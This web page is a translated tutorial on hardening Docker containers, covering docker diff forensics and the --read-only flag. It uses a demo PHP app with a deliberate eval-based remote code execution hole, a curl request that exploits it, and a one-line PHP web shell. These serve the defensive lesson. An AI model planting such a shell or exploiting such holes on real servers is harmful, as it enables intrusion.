<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Increase attack costs with Immutable Infrastructure</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Docker containers are good because they are immutable. Docker comes with a copy-on-write file system, so the base image can only be changed if you mad...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Increase attack costs with Immutable Infrastructure</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/c57/ca4/30f/c57ca430f83c4ee78b04104f61a65a51.png"><br><br><p>  Docker containers are good because they are immutable.  Docker comes with a copy-on-write file system, so the base image can only be changed if you made the appropriate commit yourself. </p><br><p>  This feature can be useful, for example, when investigating hacker attacks.  By making it possible to easily check the discrepancy between the container‚Äôs file system and the base image, it will allow you to see the changes made by the attacker. </p><a name="habracut"></a><br><h4 id="demonstracionnoe-prilozhenie">  Demo application </h4><br><p>  Take as an example the following infrastructure: </p><br><img src="https://habrastorage.org/files/5fd/c07/727/5fdc077272ac4a99bb7c58c12a94c957.png"><br><br><p>  We have a <a href="https://github.com/diogomonica/apachehackdemo">PHP application</a> running on a server with a talking name Front-end, and a MySQL database on a separate machine.  ( <em>The editors are not responsible for third-party repositories and reminds that installing software from unverified sources can lead to undesirable consequences. - Ed.</em> ) To reproduce our example at home, run: </p><br><pre><code class="bash hljs">‚ûú docker run -d --name db -e MYSQL_ROOT_PASSWORD=insecurepwd mariadb ‚ûú docker run -d -p 80:80 --link db:db diogomonica/phphack</code> </pre> <br><p>  Now that you have a working database and client part at your disposal, you should see something like this greeting: </p><br><img src="https://habrastorage.org/files/09b/d26/ba6/09bd26ba62754bc9ae05096b88476210.png">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>  Unfortunately, as in every other PHP application in the real world, in our test example there is a hole that allows an attacker to remotely execute arbitrary code: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($links) { &lt;h3&gt;Links found&lt;/h3&gt; ... <span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>($_GET[<span class="hljs-string"><span class="hljs-string">'shell'</span></span>]); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br><p>  Looks like someone is using <code>eval</code> in the wrong place!  Therefore, a potential attacker can take advantage of our carelessness and execute arbitrary code on a vulnerable server: </p><br><pre> <code class="bash hljs">‚ûú curl -s http://localhost/\?shell\=system\(<span class="hljs-string"><span class="hljs-string">"id"</span></span>\)\; | grep <span class="hljs-string"><span class="hljs-string">"uid="</span></span> uid=33(www-data) gid=33(www-data) groups=33(www-data)</code> </pre> <br><p>  On a newly hacked machine, a hacker usually tries to get comfortable: it downloads the PHP shell and various toolkits.  Some hackers are also prone to replacing the look and content of your site: </p><br><img src="https://habrastorage.org/files/f01/492/7de/f014927de77640c49b7fe3f4ea03ae65.png"><br><br><h4 id="vosstanavlivaemsya-posle-ataki">  Recovering from attack </h4><br><p>  One of the great things provided by the copy-on-write file system is the ability to see the changes that have occurred in the container.  The <code>docker diff</code> team will show what the hacker did with our files: </p><br><pre> <code class="bash hljs">‚ûú docker diff pensive_meitner C /run C /run/apache2 A /run/apache2/apache2.pid C /run/lock C /run/lock/apache2 C /var C /var/www C /var/www/html C /var/www/html/index.html A /var/www/html/shell.php</code> </pre> <br><p>  Very interesting!  It turns out that the attacker not only changed our <code>index.html</code> , but also loaded the PHP command shell, carefully named <code>shell.php</code> .  But the first thing is to restore the site. </p><br><p>  For further investigation, the hacked system image can be saved with the <code>docker commit</code> .  And since the containers are uncomfortable, we restart <em>diogomonica / phphack with a flick of the wrist</em> and return to normal operation: </p><br><pre> <code class="bash hljs">‚ûú docker commit pensive_meitner sha256:ebc3cb7c3a312696e3fd492d0c384fe18550ef99af5244f0fa6d692b09fd0af3 ‚ûú docker <span class="hljs-built_in"><span class="hljs-built_in">kill</span></span> pensive_meitner ‚ûú docker run -d -p 80:80 --link db:db diogomonica/phphack</code> </pre> <br><img src="https://habrastorage.org/files/543/949/be2/543949be234a46a389bd8c16d30b2b3d.png"><br><br><p>  Now let's take the saved image and see what changes the hacker made: </p><br><pre> <code class="bash hljs">‚ûú docker run -it ebc3cb7c3a312696e3fd492d0c384fe18550ef99af5244f0fa6d692b09fd0af3 sh <span class="hljs-comment"><span class="hljs-comment"># cat index.html &lt;blink&gt;HACKED BY SUPER ELITE GROUP OF HACKERS&lt;/blink&gt; # cat shell.php &lt;?php eval($_GET['cmd']); ?&gt;</span></span></code> </pre> <br><p>  It seems that the guys from SUPER ELITE GROUP OF HACKERS just hacked us. </p><br><h4 id="uvelichivaem-stoimost-ataki">  We increase the cost of attack </h4><br><p>  Of course, it is useful to be able to see the changes in the container after the attack, but how to avoid the attack itself? </p><br><p>  To do this, there is an option - <code>--read-only</code> , which instructs Docker to prevent changes to the container's file system.  Its installation could prevent the <code>index.html</code> modification, but more importantly, the attacker would not be able to load the command shell or any other tool he needs. </p><br><p>  Let's see how it works: </p><br><pre> <code class="bash hljs">‚ûú docker run -p 80:80 --link db:db -v /tmp/apache2:/var/run/apache2/ -v /tmp/apache:/var/lock/apache2/ --sig-proxy=<span class="hljs-literal"><span class="hljs-literal">false</span></span> --<span class="hljs-built_in"><span class="hljs-built_in">read</span></span>-only diogomonica/phphack ... 172.17.0.1 - - [04/Sep/2016:03:59:06 +0000] <span class="hljs-string"><span class="hljs-string">"GET / HTTP/1.1"</span></span> 200 219518 <span class="hljs-string"><span class="hljs-string">"-"</span></span> <span class="hljs-string"><span class="hljs-string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36 OPR/39.0.2256.48"</span></span> sh: 1: cannot create index.html: Read-only file system</code> </pre> <br><p>  Since our file system is now read-only, the hacker‚Äôs attempts to change <code>index.html</code> failed. </p><br><h4 id="daet-li-eto-stoprocentnuyu-garantiyu">  Does it provide an absolute guarantee? </h4><br><p>  In no case.  Until we fix the existing RCE vulnerability, hackers will still be able to freely execute arbitrary code on our machine and, for example, steal identity information or steal data from the database. </p><br><p>  Nevertheless, there is a real opportunity to significantly complicate the lives of hackers trying to hack our systems.  To do this, you need to use Docker security tools and <a href="https://hub.docker.com/_/alpine/">minimal images</a> for containers. </p><br><h4 id="zaklyuchenie">  Conclusion </h4><br><p>  The security of our applications will never be one hundred percent.  But using Immutable infrastructure can make it harder for hackers to work, and if hacking does happen, it can make the recovery process much easier. </p><br><p>  So for the sake of security and stability it is quite possible to twist up a few pens and strengthen the defense of our containers! </p></div><p>Source: <a href="https://habr.com/ru/post/316386/">https://habr.com/ru/post/316386/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../316374/index.html">Under the hood of the new crafts Dell + EMC - flash storage at the price of disk</a></li>
<li><a href="../316376/index.html">Entity? Provide your IP address</a></li>
<li><a href="../316378/index.html">Welcome to the DevFest Vladivostok</a></li>
<li><a href="../316380/index.html">FIAS addresses in the PostgreSQL environment. Part 2</a></li>
<li><a href="../316382/index.html">FreeNAS 10 - the new face of the old storage</a></li>
<li><a href="../316388/index.html">Never take a counter offer</a></li>
<li><a href="../316392/index.html">Why not Assets Pipeline?</a></li>
<li><a href="../316394/index.html">5 reasons not to use your personal account in freelance</a></li>
<li><a href="../316396/index.html">Ukrainian company has developed a private cloud for Silicon Valley startups</a></li>
<li><a href="../316400/index.html">Deploy OpenSource Puppet 4 with multiple puppet masters. Part I. Preparatory</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>